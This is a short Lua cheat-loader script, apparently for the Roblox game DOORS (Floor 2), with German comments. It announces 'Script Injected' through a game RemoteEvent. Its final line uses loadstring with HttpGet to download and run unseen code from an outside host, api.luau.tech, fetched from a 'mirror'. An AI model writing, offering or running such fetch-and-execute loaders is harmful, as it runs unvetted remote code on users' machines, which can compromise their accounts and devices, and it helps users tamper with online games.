-- DOORS Floor 2 Mines - Direct Internal Script
local function notify(title, text)
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = title, Text = text, Duration = 5})
end

notify("System", "Lade Floor 2 Script...")

-- Diese Methode nutzt die internen RemoteEvents von Floor 2
local remote = game:GetService("ReplicatedStorage"):WaitForChild("EntityInfo"):WaitForChild("Caption")
remote:FireServer("Script Injected - Floor 2 Support")

-- Hier den direkten Raw-Code von einem anderen Mirror laden
_G.CustomFloor2 = true
shared.GuiColor = Color3.fromRGB(255, 0, 0)
loadstring(game:HttpGet("https://api.luau.tech"))()
